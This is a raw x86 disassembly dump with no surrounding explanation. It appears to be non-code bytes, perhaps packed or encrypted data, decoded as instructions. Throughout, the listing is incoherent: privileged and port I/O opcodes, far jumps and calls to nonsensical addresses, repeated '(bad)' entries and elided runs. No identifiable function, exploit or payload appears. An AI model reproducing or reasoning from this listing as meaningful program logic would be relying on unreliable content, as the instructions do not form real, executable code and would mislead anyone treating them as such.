  404fc2:	aam    0x5f
  404fc4:	xor    al,0xa1
  404fc6:	das    
  404fc7:	add    al,0x8c
  404fc9:	fs pop esi
  404fcb:	pop    ss
  404fcc:	fmul   DWORD PTR [eax]
  404fce:	fcom   QWORD PTR [edi+0x24]
  404fd1:	outs   dx,BYTE PTR ds:[esi]
  404fd2:	dec    eax
  404fd3:	popf   
  404fd4:	or     ebx,DWORD PTR [ebp+0x1721]
	...
  404fea:	add    BYTE PTR [eax],al
  404fec:	mov    ?,ebp
  404fee:	out    dx,eax
  404fef:	cmp    BYTE PTR [ecx-0x5c],0xe1
  404ff3:	pop    ss
  404ff4:	cwde   
  404ff5:	or     DWORD PTR [ebx+esi*8-0x631a8116],edx
  404ffc:	pop    ecx
  404ffd:	inc    eax
  404ffe:	or     DWORD PTR [ebp+edx*8+0x8],eax
  405002:	push   es
  405003:	or     esp,ecx
  405005:	jle    0x404fea
  405007:	test   al,0xa3
  405009:	sbb    eax,0x7fe70929
  40500e:	ror    BYTE PTR [esi-0x636ec7af],1
  405014:	cmp    DWORD PTR [eax-0x41fe912],esp
  40501a:	pop    es
  40501b:	cdq    
  40501c:	mov    ds:0x9bbb6a08,eax
  405021:	jle    0x404fc0
  405023:	stos   DWORD PTR es:[edi],eax
  405024:	jmp    0xa182:0x8b03e0d0
  40502b:	stos   DWORD PTR es:[edi],eax
  40502c:	jb     0x405019
  40502e:	mov    ebp,0x65827b9c
  405033:	stos   DWORD PTR es:[edi],eax
  405034:	push   0xffffffeb
  405036:	lods   eax,DWORD PTR ds:[esi]
  405037:	pushf  
  405038:	imul   eax,DWORD PTR [edx-0x14bd5497],0xffffff9d
  40503f:	pushf  
  405040:	jp     0x9d18537b
  405046:	mov    ss,WORD PTR [esi]
  405048:	clc    
  405049:	cld    
  40504a:	nop
  40504b:	mov    ecx,0x62080843
	...
  405064:	dec    esp
  405065:	ins    BYTE PTR es:[edi],dx
  405066:	push   edi
  405067:	mov    al,ds:0xbc08a54d
  40506c:	adc    al,0xf9
  40506e:	mov    ah,BYTE PTR ds:0x32236407
  405074:	or     al,0x8a
  405076:	add    al,0xe9
  405078:	jnp    0x4050d0
  40507a:	mov    eax,esp
  40507c:	inc    DWORD PTR [edi]
  40507e:	jnp    0x405031
  405080:	adc    dl,BYTE PTR [edx-0xc]
  405083:	cdq    
  405084:	sbb    BYTE PTR [edx-0x3193befc],al
  40508a:	pop    es
  40508b:	jmp    0xd9b025a2
  405090:	add    BYTE PTR [edx-0x1d7ffefc],al
  405096:	test   BYTE PTR [esi],0x6
  405099:	push   edx
  40509a:	lock push es
  40509c:	mov    ds:0xca8de008,al
  4050a1:	xchg   esp,eax
  4050a2:	or     dl,ah
  4050a4:	iret   
  4050a5:	adc    BYTE PTR [ecx],0xee
  4050a8:	cdq    
  4050a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050aa:	neg    DWORD PTR [eax+ecx*1+0x65]
  4050ae:	not    DWORD PTR [eax+edx*4-0x4]
  4050b2:	or     dl,bh
  4050b4:	test   DWORD PTR [edi],0x81f7b183
  4050ba:	hlt    
  4050bb:	sar    DWORD PTR [ebp+0x26e907d1],1
  4050c1:	add    DWORD PTR [ecx+eax*8],0xaef6e0bd
	...
  4050dc:	add    edx,ebx
  4050de:	push   edx
  4050df:	mov    al,0x52
  4050e1:	cwde   
  4050e2:	or     BYTE PTR [ebx+edx*1],dh
  4050e5:	clc    
  4050e6:	mov    BYTE PTR [ebp-0x7108f980],ch
  4050ec:	add    eax,0x13007a11
  4050f1:	sub    esi,edi
  4050f3:	push   eax
  4050f4:	popf   
  4050f5:	xchg   ecx,eax
  4050f6:	or     DWORD PTR [eax],eax
  4050f8:	and    eax,0x25c7103b
  4050fd:	xchg   ebx,eax
  4050fe:	rol    ebx,0xe8
  405101:	adc    eax,0x9b4083e4
  405106:	or     BYTE PTR [edx+eiz*1+0xe],dh
  40510a:	jne    0x40511c
  40510c:	and    eax,0x48ff1197
  405111:	div    ebp
  405113:	jne    0x405112
  405115:	cmp    dl,bh
  405117:	(bad)  
  405118:	ret    0xf72b
  40511b:	jne    0x4050f2
  40511d:	sub    DWORD PTR [ebp+0xc],edi
  405120:	mov    dl,0xa5
  405122:	add    al,ch
  405124:	jmp    0x17ce:0xacfff741
  40512b:	add    BYTE PTR [eax],bl
  40512d:	push   ss
  40512e:	in     al,0x83
  405130:	adc    BYTE PTR [ebx+0xde17408],bl
  405136:	jne    0x405144
  405138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405139:	xchg   esi,eax
  40513a:	push   ds
  40513b:	(bad)  
  40513c:	cmp    BYTE PTR [ebx],al
  40513e:	div    BYTE PTR [ebp+0x0]
	...
  405151:	add    BYTE PTR [eax],al
  405153:	add    BYTE PTR [ebp-0x3d2944c6],bl
  405159:	sub    edi,esi
  40515b:	jne    0x40510e
  40515d:	sub    DWORD PTR [ebp+0x8],edi
  405160:	int    0x98
  405162:	(bad)  
  405164:	push   edx
  405165:	fxch   st(1)
  405167:	or     al,0x75
  405169:	lds    eax,FWORD PTR [ebx-0x7ba1914]
  40516f:	(bad)  
  405170:	mov    eax,0x5245e09c
  405175:	sub    esi,edi
  405177:	mov    DWORD PTR [eax-0x73827464],ebp
  40517d:	out    dx,eax
  40517e:	or     dh,BYTE PTR [edx+edi*4+0x16]
  405182:	sbb    BYTE PTR [esp+esi*1],cl
  405185:	int    0xb1
  405187:	inc    DWORD PTR [ebx+0x3]
  40518a:	retf   
  40518b:	je     0x40515b
  40518d:	jo     0x4051d7
  40518f:	lock fdiv QWORD PTR [esi+0x18]
  405193:	or     al,0x34
  405195:	in     al,0xb1
  405197:	jmp    DWORD PTR [ebx]
  405199:	add    ecx,ebx
  40519b:	je     0x4051fb
  40519d:	jl     0x4051af
  40519f:	cld    
  4051a0:	mov    ebx,?
  4051a2:	cli    
  4051a3:	(bad)  
  4051a4:	jle    0x405141
  4051a6:	xchg   ebx,eax
  4051a7:	jne    0x4051a9
  4051a9:	(bad)  
  4051aa:	sbb    al,bh
  4051ac:	in     al,0xc2
  4051ae:	lods   eax,DWORD PTR ds:[esi]
  4051af:	push   ebx
  4051b1:	repnz retf 0x7d75
  4051b5:	scas   al,BYTE PTR es:[edi]
  4051b6:	sbb    BYTE PTR [eax],dl
	...
  4051cc:	jecxz  0x4051ee
  4051ce:	lahf   
  4051cf:	jmp    DWORD PTR [ecx-0x5d]
  4051d2:	xchg   edx,eax
  4051d3:	jne    0x405159
  4051d5:	xchg   ebx,eax
  4051d6:	inc    edx
  4051d7:	dec    ebx
  4051d9:	mov    es,WORD PTR [eax-0x5cd443bb]
  4051df:	(bad)  
  4051e0:	(bad)  
  4051e2:	nop
  4051e3:	(bad)  
  4051e4:	cmp    edi,esp
  4051e6:	mov    ds:0x90eec586,al
  4051eb:	leave  
  4051ec:	into   
  4051ed:	test   DWORD PTR [edx],0x8cd00755
  4051f3:	les    ebx,FWORD PTR [esi+edx*8+0x27740c06]
  4051fa:	mov    dl,0xff
  4051fc:	add    DWORD PTR [edi+esi*1+0xc00f0c],0x0
  405204:	clc    
  405205:	scas   al,BYTE PTR es:[edi]
  405206:	xchg   ecx,eax
  405207:	jne    0x4051a1
  405209:	xchg   esp,eax
  40520a:	cdq    
  40520b:	inc    esp
  40520c:	inc    edx
  40520d:	add    eax,0x804c0d96
  405212:	rol    BYTE PTR [esi-0x66cefb37],cl
  405218:	rcr    DWORD PTR [eax+0x5629199],0x76
  40521f:	or     eax,0x82c2804c
  405224:	mov    cl,0x8
  405226:	loope  0x40522b
  405228:	jl     0x4051be
  40522a:	shl    dl,cl
  40522c:	and    bh,BYTE PTR [edi-0xf]
  40522f:	cwde   
	...
  405244:	mov    eax,ds:0x140f5e08
  405249:	add    eax,0xf6f40bdc
  40524e:	dec    esi
  40524f:	cdq    
  405250:	add    edx,DWORD PTR [edi]
  405252:	lods   al,BYTE PTR ds:[esi]
  405253:	xchg   ebx,eax
  405254:	pop    esp
  405255:	cld    
  405256:	les    edi,FWORD PTR [eax+0xf2604f3]
  40525c:	cwde   
  40525d:	cld    
  40525e:	les    edi,FWORD PTR [edx-0x39c7fb1d]
  405264:	mov    BYTE PTR [esp+esi*4+0x2d10e08c],dl
  40526b:	xchg   esp,eax
  40526c:	pop    edi
  40526d:	mov    ecx,0x9c39992a
  405272:	sbb    DWORD PTR [ecx],ebp
  405274:	fiadd  DWORD PTR [esi+edi*8]
  405277:	mov    cl,BYTE PTR [ecx-0x64]
  40527a:	bound  edx,QWORD PTR [edi]
  40527c:	xchg   esp,eax
  40527d:	xchg   esp,eax
  40527e:	push   ebp
  40527f:	inc    edx
  405280:	mov    ds:0xb7abf97e,eax
  405285:	out    0xdd,al
  405287:	cwde   
  405288:	xchg   esp,edx
  40528a:	pop    esp
  40528b:	(bad)  
  40528c:	sbb    BYTE PTR [edx-0x4f],bl
  40528f:	xor    eax,DWORD PTR [ebx+0x1eabf98a]
  405295:	jecxz  0x40529e
  405297:	mov    dh,0x14
  405299:	nop
  40529a:	enter  0x7235,0x15
  40529e:	jne    0x405245
  4052a0:	(bad)  
  4052a1:	xchg   esp,eax
  4052a2:	sbb    cl,ch
  4052a4:	and    BYTE PTR [edi+esi*8+0x1c],0x0
	...
  4052bc:	hlt    
  4052bd:	add    edi,DWORD PTR [ebp-0x6f]
  4052c0:	idiv   DWORD PTR [ecx-0x6fdb7916]
  4052c6:	enter  0x8ef5,0x57
  4052ca:	test   DWORD PTR [eax+ebx*1],ebp
  4052cd:	gs loopne 0x4052b9
  4052d0:	in     al,0x3
  4052d2:	mul    DWORD PTR [esi-0x6e]
  4052d5:	mov    eax,fs
  4052d7:	sub    edi,edx
  4052d9:	add    esi,edi
  4052db:	bound  ecx,QWORD PTR [eax+0x60]
  4052de:	shr    DWORD PTR [ebx],0xb
  4052e1:	add    al,0x5c
  4052e3:	jb     0x405310
  4052e5:	push   ss
  4052e6:	int3   
  4052e7:	jne    0x4052fe
  4052e9:	add    al,0xf7
  4052eb:	cs jb  0x40532a
  4052ee:	imul   BYTE PTR [esi]
  4052f0:	add    al,0x95
  4052f2:	or     cl,ch
  4052f4:	(bad)  
  4052f5:	cmovge ebp,ebp
  4052f8:	mov    ah,dl
  4052fa:	jnp    0x4052e8
  4052fc:	bsr    ecx,DWORD PTR [eax]
  4052ff:	xchg   esp,eax
  405300:	retf   0x6fec
  405303:	call   0x7537e797
  405308:	xchg   ebx,eax
  405309:	in     al,dx
  40530a:	aam    0xa
  40530c:	adc    al,0x4
  40530e:	add    ebp,DWORD PTR [ecx]
  405310:	call   0x855:0x4bda6093
  405317:	fidivr WORD PTR [ebp-0x70]
  40531a:	loopne 0x40530e
  40531c:	fild   DWORD PTR [ebx]
  40531e:	test   edx,0x0
	...
  405334:	xchg   ebp,eax
  405335:	ins    BYTE PTR es:[edi],dx
  405336:	lock add BYTE PTR [edx-0x3f00f7a7],bh
  40533d:	mov    eax,fs
  40533f:	or     al,0x19
  405341:	sub    esi,edi
  405343:	mov    eax,esi
  405345:	pusha  
  405346:	idiv   bh
  405348:	sub    dh,BYTE PTR [eax-0x689afeca]
  40534e:	test   DWORD PTR [ebp-0x8d5d9],eax
  405354:	test   DWORD PTR [eax],esi
  405356:	mov    eax,ds
  405358:	or     ch,BYTE PTR [ebx]
  40535a:	test   DWORD PTR [ebp-0x8d619],eax
  405360:	xchg   ebp,eax
  405361:	sub    edi,DWORD PTR [ebp-0x8d44448]
  405367:	call   0x482a6f
  40536c:	pushf  
  40536d:	adc    eax,0x2bbafeb4
  405372:	dec    eax
  405373:	(bad)  
  405375:	inc    BYTE PTR [edi]
  405377:	add    ch,dh
  405379:	or     ebx,DWORD PTR [ebp-0x8d4443e]
  40537f:	mul    edi
  405381:	push   es
  405382:	idiv   edi
  405384:	cmc    
  405385:	cdq    
  405386:	mov    WORD PTR [ebx-0x72f7690b],es
  40538c:	daa    
  40538d:	sti    
  40538e:	inc    esi
  40538f:	push   0x495b8b
  405394:	lea    ebx,[ebx]
  405396:	retf   
	...
  4053ab:	add    BYTE PTR [ebp-0x4f8a3773],dh
  4053b1:	das    
  4053b2:	les    eax,FWORD PTR [eax]
  4053b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053b5:	xchg   esi,eax
  4053b6:	test   DWORD PTR [ebp-0x8d589],edx
  4053bc:	sbb    BYTE PTR [ebp+0x24],dl
  4053bf:	push   eax
  4053c0:	cmp    eax,0x8c414728
  4053c5:	in     eax,dx
  4053c6:	mov    ds:0xaec4f72,al
  4053cb:	or     ecx,DWORD PTR [ecx+eax*8+0x9]
  4053cf:	jmp    0x4b3fff
  4053d4:	jae    0x405397
  4053d6:	add    al,ch
  4053d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053d9:	into   
  4053da:	popf   
  4053db:	call   DWORD PTR [edi-0x1bf0e7d5]
  4053e1:	push   edx
  4053e2:	inc    ebx
  4053e3:	inc    ecx
  4053e4:	mov    WORD PTR [edx],gs
  4053e6:	sbb    BYTE PTR [esp+esi*1],cl
  4053e9:	stos   DWORD PTR es:[edi],eax
  4053ea:	mov    bl,0xff
  4053ec:	inc    ebx
  4053ed:	daa    
  4053ee:	add    DWORD PTR [edx-0x74],ebp
  4053f1:	sbb    BYTE PTR [eax],0xc
  4053f4:	and    al,0x97
  4053f6:	mov    bl,0xff
  4053f8:	sub    esp,DWORD PTR [ecx+0x78]
  4053fb:	ret    0x7b22
  4053fe:	sahf   
  4053ff:	lea    edi,[esi+0x24503a8f]
  405405:	sbb    esi,DWORD PTR [edx-0x61c3f401]
  40540b:	jne    0x4053b1
  40540d:	pop    edx
  40540e:	sbb    BYTE PTR [eax+eax*1],dl
	...
  405421:	add    BYTE PTR [eax],al
  405423:	add    bl,bh
  405425:	dec    eax
  405426:	sti    
  405427:	dec    edi
  405428:	repz inc eax
  40542a:	add    ebp,eax
  40542c:	fdiv   QWORD PTR [ecx+0x4ff4ff9e]
  405432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405433:	(bad)  
  405434:	(bad)  [esi-0x28b172d5]
  40543a:	add    DWORD PTR [ebp-0x616e00],0xf
  405441:	sbb    ebx,edi
  405443:	inc    DWORD PTR [eax-0x13]
  405446:	mov    eax,ds:0xfb80b312
  40544b:	(bad)  
  40544c:	loope  0x405415
  40544e:	popf   
  40544f:	jmp    DWORD PTR [ebx-0x3072266c]
  405455:	xchg   esp,eax
  405456:	loope  0x405460
  405458:	int3   
  405459:	mov    BYTE PTR [esp+ebp*1],bl
  40545c:	cmp    ecx,DWORD PTR [eax+eiz*1+0x4]
  405460:	add    DWORD PTR [edi-0x22625403],0xffffffb5
  405467:	xchg   ebp,eax
  405468:	jae    0x4054b1
  40546a:	jne    0x405402
  40546c:	imul   eax,DWORD PTR [ecx],0x11
  40546f:	lods   al,BYTE PTR ds:[esi]
  405470:	(bad)
  405473:	xchg   ebp,eax
  405474:	mov    esp,0x53fc1415
  405479:	test   ebp,ebp
  40547b:	xchg   esp,eax
  40547c:	shr    DWORD PTR [eax-0x73466acf],0x8e
  405483:	das    
  405484:	xchg   esp,eax
  405485:	in     eax,dx
  405486:	in     al,0x94
	...
  40549c:	mov    ecx,0xa19511a8
  4054a1:	mov    WORD PTR [ecx+0x6e012130],cs
  4054a7:	lods   al,BYTE PTR ds:[esi]
  4054a8:	into   
  4054a9:	jmp    0x1741ea03
  4054ae:	and    edx,DWORD PTR [esi-0x6b4efef5]
  4054b4:	cmp    DWORD PTR [eax+0x4f],eax
  4054b7:	xchg   ebp,eax
  4054b8:	sti    
  4054b9:	jmp    0x405441
  4054bb:	ret    0x948c
  4054be:	les    ebx,FWORD PTR fs:[ebx-0x1c69cfe9]
  4054c5:	add    BYTE PTR [esi],ch
  4054c7:	dec    edi
  4054c8:	sbb    BYTE PTR [edx],al
  4054ca:	push   ss
  4054cb:	xchg   ebp,eax
  4054cc:	in     al,0x32
  4054ce:	and    eax,DWORD PTR [esp+ecx*4]
  4054d1:	add    DWORD PTR [esp+ebx*2-0x3e],ebx
  4054d5:	add    BYTE PTR [esi],cl
  4054d7:	lods   al,BYTE PTR ds:[esi]
  4054d8:	sahf   
  4054d9:	jmp    0xd605e9d3
  4054de:	pop    es
  4054df:	fisttp QWORD PTR [edi+0x75fd8367]
  4054e5:	xchg   esp,eax
  4054e6:	neg    DWORD PTR [esp+ebx*4+0x1]
  4054ea:	jge    0x4054e5
  4054ec:	clc    
  4054ed:	xchg   BYTE PTR [esi+edx*8],al
  4054f0:	call   0xf700:0x1a0ee08c
  4054f7:	mov    al,0x4d
  4054f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054fa:	or     BYTE PTR [eax*1+0x3cf6f1],dl
	...
  405511:	add    BYTE PTR [eax],al
  405513:	add    BYTE PTR [esp+ebp*8-0x76db8],dl
  40551a:	add    ch,BYTE PTR [ecx+0x14f79e8b]
  405520:	pop    eax
  405521:	push   eax
  405522:	loopne 0x4054ca
  405524:	add    eax,0x1939f700
  405529:	mov    dl,BYTE PTR [eax]
  40552b:	xchg   BYTE PTR [edx-0x7d81a758],cl
  405531:	mov    eax,fs
  405533:	aaa    
  405534:	add    BYTE PTR [eax],al
  405536:	test   DWORD PTR [ecx+0x66f6e6e0],0xe91bd346
  405540:	bound  ecx,QWORD PTR [ebx]
  405542:	in     al,0x56
  405544:	call   0x7cfe:0xffd4f7a8
  40554b:	cmc    
  40554c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40554d:	call   0x36b0:0xec87b4f7
  405554:	add    BYTE PTR [eax],al
  405556:	div    DWORD PTR [ebx+esi*8+0xf97cfe]
  40555d:	mov    al,BYTE PTR [ebx+edx*4]
  405560:	in     al,dx
  405561:	(bad)  
  405562:	jl     0x405545
  405564:	div    DWORD PTR [esi]
  405566:	test   DWORD PTR [esi],0x7d0018
  40556c:	fldcw  WORD PTR [eax]
  40556e:	jge    0x405580
  405570:	mov    dl,0x91
  405572:	add    al,0x6a
  405574:	shr    DWORD PTR [eax],0x7d
  405577:	or     BYTE PTR [eax],al
	...
  405589:	add    BYTE PTR [eax],al
  40558b:	add    BYTE PTR [ebp-0x4d00087c],cl
  405591:	inc    ecx
  405592:	retf   0xa510
  405595:	mov    esp,0xccf6ec83
  40559a:	not    DWORD PTR [ebx-0x45]
  40559d:	mov    ebx,0x4dfedb23
  4055a2:	add    al,0xff
  4055a4:	jne    0x4055b8
  4055a6:	dec    ebp
  4055a7:	clc    
  4055a8:	and    bl,BYTE PTR [ebp+0x24a88f00]
  4055ae:	iret   
  4055af:	inc    ebp
  4055b0:	stc    
  4055b1:	xchg   edi,eax
  4055b2:	or     BYTE PTR [eax],al
  4055b4:	gs push ss
  4055b6:	xor    eax,0x8596ead
  4055bb:	add    BYTE PTR [ecx+0x3d7d8bc4],bl
  4055c1:	xchg   ebx,eax
  4055c2:	jl     0x40561a
  4055c4:	mov    al,ds:0x8f50f84d
  4055c9:	cdq    
  4055ca:	bound  eax,QWORD PTR [eax]
  4055cc:	(bad)  
  4055cd:	cwde   
  4055ce:	mov    edi,DWORD PTR [ebp+0x15]
  4055d1:	xchg   ebx,eax
  4055d2:	jl     0x4055d9
  4055d4:	mov    dl,0x9d
  4055d6:	sbb    bl,ch
  4055d8:	mul    DWORD PTR [eax+0x13f56a08]
  4055de:	dec    ebp
  4055df:	clc    
  4055e0:	adc    eax,0x3ead1d22
  4055e5:	pop    eax
  4055e6:	or     BYTE PTR [ebx],cl
  4055e8:	mov    ch,0x9c
  4055ea:	daa    
  4055eb:	xor    DWORD PTR [eax],0x27
  4055ee:	or     BYTE PTR [eax+eax*1+0x0],dh
	...
  405602:	add    BYTE PTR [eax],al
  405604:	mov    esp,0x5e0c4d7d
  405609:	push   ebp
  40560a:	clc    
  40560b:	cmp    ecx,DWORD PTR [ebp+esi*8-0x6eb0e8ef]
  405612:	ja     0x405689
  405614:	rol    BYTE PTR [ecx+0x30070819],0x9b
  40561b:	jecxz  0x4055ab
  40561d:	cli    
  40561e:	outs   dx,BYTE PTR ds:[esi]
  40561f:	mov    ecx,DWORD PTR [ecx-0x1f]
  405622:	cdq    
  405623:	jne    0x4055c1
  405625:	test   DWORD PTR [ebx],ecx
  405627:	call   FWORD PTR [ecx]
  405629:	jmp    0xec8d3cc0
  40562e:	or     cl,BYTE PTR [ebx+0x5b3aaf4f]
  405634:	inc    ebp
  405635:	sub    dh,bh
  405637:	(bad)  
  405638:	fadd   DWORD PTR [edx+0x48508397]
  40563e:	ds push esi
  405640:	mov    ebx,0xcd503453
  405645:	jmp    0x4055d9
  405647:	ins    BYTE PTR es:[edi],dx
  405648:	dec    ebp
  405649:	in     al,dx
  40564a:	or     cl,BYTE PTR [ebx-0x3bfd09c]
  405650:	mov    ebx,gs
  405652:	or     al,BYTE PTR [eax]
  405654:	xchg   DWORD PTR [ebx],ebp
  405656:	pop    ds
  405657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405659:	inc    edi
  40565a:	cmp    eax,DWORD PTR [ecx-0x74]
  40565d:	call   0xb0a:0xec4cf494
  405664:	dec    esp
  405665:	loopne 0x405650
  405667:	mov    al,BYTE PTR [eax]
	...
  405679:	add    BYTE PTR [eax],al
  40567b:	add    BYTE PTR [esp+eiz*8],bl
  40567e:	das    
  40567f:	push   eax
  405680:	dec    ebp
  405681:	jmp    0x4056c0
  405683:	call   0x4c0277
  405688:	xchg   DWORD PTR [ebx+0x54071e1f],ebp
  40568e:	mov    BYTE PTR [ebp-0x18],al
  405691:	sbb    edx,DWORD PTR [ebx+0xaebccec]
  405697:	push   eax
  405698:	fist   DWORD PTR [esi+esi*1-0x1effae7a]
  40569f:	pop    ss
  4056a0:	xchg   esi,eax
  4056a1:	cmp    al,0xe0
  4056a3:	add    ecx,DWORD PTR [esp+edx*4-0x34a8ce5a]
  4056aa:	and    DWORD PTR [ebx-0x74],ecx
  4056ad:	xchg   esp,eax
  4056ae:	loope  0x4056b3
  4056b0:	dec    ebx
  4056b1:	pop    esi
  4056b2:	call   0xf9f:0x6a67cfbc
  4056b9:	fnop   
  4056bb:	test   DWORD PTR [ecx+0x6b],edx
  4056be:	cmp    al,BYTE PTR [ebx-0x74]
  4056c1:	xchg   esp,eax
  4056c2:	push   ebp
  4056c3:	test   BYTE PTR [esi],0xbf
  4056c6:	xor    al,0x3d
  4056c8:	int    0x94
  4056ca:	loope  0x4056e3
  4056cc:	test   DWORD PTR [ecx],edx
  4056ce:	hlt    
  4056cf:	adc    dl,bh
  4056d1:	push   ebx
  4056d2:	loope  0x4056d7
  4056d4:	fst    DWORD PTR [ebp-0x6b73fc87]
  4056da:	loope  0x405696
  4056dc:	dec    edi
  4056dd:	cvttps2pi mm1,QWORD PTR [esi+0x0]
	...
  4056f4:	push   edx
  4056f5:	xchg   esp,eax
  4056f6:	loope  0x4056c1
  4056f8:	int3   
  4056f9:	xchg   ebx,eax
  4056fa:	loope  0x4056c5
  4056fc:	int3   
  4056fd:	xchg   edx,eax
  4056fe:	loope  0x4056c9
  405700:	int3   
  405701:	xchg   ecx,eax
  405702:	loope  0x4056cd
  405704:	int3   
  405705:	cwde   
  405706:	loope  0x4056d1
  405708:	int3   
  405709:	xchg   edi,eax
  40570a:	in     al,dx
  40570b:	jle    0x4056de
  40570d:	or     BYTE PTR [ecx-0x1e9573e3],dh
  405713:	sbb    eax,0x1de16a8c
  405718:	mov    WORD PTR [edx-0x1f],gs
  40571b:	sbb    ebp,DWORD PTR [edx+edx*4-0x4b99fc1f]
  405722:	fild   DWORD PTR ds:0x33085719
  405728:	cwde   
  405729:	std    
  40572a:	sbb    al,0xc0
  40572c:	cwde   
  40572d:	push   ebx
  40572e:	or     dl,dh
  405730:	iret   
  405731:	xchg   BYTE PTR [edx],cl
  405733:	xor    cl,dl
  405735:	aam    0x4c
  405737:	sbb    DWORD PTR [eax+0x3ae90894],ecx
  40573d:	push   edi
  40573e:	clc    
  40573f:	cdq    
  405740:	sbb    al,0x87
  405742:	cld    
  405743:	xchg   ebx,eax
  405744:	(bad)  
  405745:	std    
  405746:	sbb    al,0x84
  405748:	pusha  
  405749:	push   ebx
  40574a:	or     dl,ah
  40574c:	iret   
  40574d:	xchg   BYTE PTR [edi],cl
  40574f:	scas   al,BYTE PTR es:[edi]
  405750:	dec    edx
  405751:	add    al,0x8
  405753:	jmp    0x5d37ebe7
	...
  40576c:	and    al,0xfc
  40576e:	sbb    al,0x58
  405770:	mov    ecx,0xca720855
  405775:	add    al,0xc1
  405777:	stos   BYTE PTR es:[edi],al
  405778:	mov    ds:0x4b6ae40f,al
  40577d:	or     eax,0x64d82485
  405782:	pusha  
  405783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405784:	int3   
  405785:	push   ebp
  405786:	or     BYTE PTR [ecx-0x69090966],dl
  40578c:	jg     0x40571d
  40578e:	enter  0x8615,0x17
  405792:	jne    0x405805
  405794:	cmp    eax,DWORD PTR [ebx+0x4d26c63]
  40579a:	pop    eax
  40579b:	and    edx,0x12e907d4
  4057a1:	aad    0x6f
  4057a3:	(bad)  
  4057a4:	mov    WORD PTR [edx+0x4d],es
  4057a7:	pop    esi
  4057a8:	mov    edi,0x1dacbe8b
  4057ad:	gs pop es
  4057af:	xchg   edi,eax
  4057b0:	push   edx
  4057b1:	stc    
  4057b2:	push   edi
  4057b3:	add    dl,bh
  4057b5:	pop    ebp
  4057b6:	dec    ebp
  4057b7:	cld    
  4057b8:	add    eax,0x9e45be95
  4057bd:	mov    DWORD PTR [edi],0x580a30b6
  4057c3:	rdpmc  
  4057c5:	push   edx
  4057c6:	icebp  
  4057c7:	push   eax
  4057c8:	mov    edx,0x5f84d5d
  4057cd:	xchg   ebp,eax
  4057ce:	mov    edi,0x45
	...
  4057e3:	add    BYTE PTR [ebx-0x1f48f839],ah
  4057e9:	and    ebx,DWORD PTR [eax-0x1]
  4057ec:	and    BYTE PTR [edi],ah
  4057ee:	pusha  
  4057ef:	add    DWORD PTR ds:0xf08d0857,eax
  4057f5:	jnp    0x40584f
  4057f7:	call   0x482907
  4057fc:	test   ah,0x3b
  4057ff:	lea    esi,[eax-0x6417a7ec]
  405805:	dec    ebx
  405806:	or     BYTE PTR [eax],al
  405808:	xchg   ebp,eax
  405809:	adc    eax,0x98858c4d
  40580e:	hlt    
  40580f:	dec    edi
  405810:	mov    ah,0x90
  405812:	loopne 0x405801
  405814:	inc    ebp
  405815:	or     esi,edi
  405817:	call   0x37949d
  40581c:	cld    
  40581d:	(bad)  
  40581e:	pop    esp
  40581f:	mov    ecx,DWORD PTR [ecx]
  405821:	adc    esp,ecx
  405823:	sub    al,0xa
  405825:	or     esi,edi
  405827:	push   ebx
  405828:	xchg   edx,eax
  405829:	sahf   
  40582a:	or     BYTE PTR [edx+0x35],ch
  40582d:	or     bh,BYTE PTR [ebp+0x8]
  405830:	or     eax,0xaaffd917
  405835:	jns    0x405884
  405837:	cld    
  405838:	cmp    eax,0x2bef0890
  40583d:	or     edi,DWORD PTR [ebp+0x8]
  405840:	mov    WORD PTR [ebp-0x58],ss
  405843:	sar    bl,1
  405845:	dec    ecx
  405846:	adc    al,0x9c
	...
  40585c:	mov    ebp,gs
  40585e:	or     cl,BYTE PTR [ebp-0x7a32ef]
  405864:	jecxz  0x405882
  405866:	xchg   ebx,eax
  405867:	pop    eax
  405868:	shr    BYTE PTR [ecx+0xd09c787],0x86
  40586f:	dec    ebx
  405871:	js     0x40587f
  405873:	add    BYTE PTR [eax+esi*2-0x76449f7f],cl
  40587a:	xchg   DWORD PTR [eax-0x5c],edx
  40587d:	dec    eax
  40587e:	inc    edi
  40587f:	add    BYTE PTR [esi+eiz*8+0x6fbe2bb3],cl
  405886:	pop    ecx
  405887:	je     0x405824
  405889:	jmp    0x6dc04413
  40588e:	(bad)  
  40588f:	inc    DWORD PTR [eax]
  405891:	icebp  
  405892:	inc    eax
  405893:	add    DWORD PTR [ebx+ebp*8+0x605e0b0a],ecx
  40589a:	or     eax,esi
  40589c:	mov    ebp,ebx
  40589e:	dec    ebp
  40589f:	inc    ecx
  4058a0:	or     eax,0x8c008ad5
  4058a5:	jmp    0x4058bf
  4058a7:	in     eax,0x87
  4058a9:	sub    ebx,DWORD PTR [edi]
  4058ab:	push   ss
  4058ac:	in     al,0xf
  4058ae:	or     eax,DWORD PTR [eax]
  4058b0:	mov    WORD PTR [eax-0x80],gs
  4058b3:	pusha  
  4058b4:	inc    ebx
  4058b5:	and    eax,DWORD PTR [esi-0xb5ec4b0]
  4058bb:	out    0xf0,eax
  4058bd:	sbb    eax,DWORD PTR [esi+0xff]
	...
  4058d3:	add    BYTE PTR [edi],dh
  4058d5:	call   0xebf658ea
  4058da:	test   DWORD PTR [ebp-0x7c],esi
  4058dd:	adc    edx,DWORD PTR [ebp-0x30]
  4058e0:	adc    edx,DWORD PTR [ebp-0x8266492]
  4058e6:	push   ebp
  4058e7:	mov    ds,WORD PTR [ecx+edi*8-0x2d]
  4058eb:	sti    
  4058ec:	rep outs dx,BYTE PTR ds:[esi]
  4058ee:	xor    DWORD PTR [esi+0x7e16cf3],ecx
  4058f4:	mov    WORD PTR [ecx+ebx*2+0x3df9bfc5],ss
  4058fb:	jl     0x40590e
  4058fd:	pop    ecx
  4058fe:	es mov ss,ebx
  405901:	ins    BYTE PTR es:[edi],dx
  405902:	add    cl,BYTE PTR cs:[esp+edx*4-0x69fa7ea]
  40590a:	sbb    eax,0xf196248e
  40590f:	add    ecx,DWORD PTR [esp+ebp*2-0x6b73f81f]
  405916:	sbb    eax,ebp
  405918:	loop   0x4058ae
  40591a:	loope  0x40594f
  40591c:	fwait
  40591d:	aas    
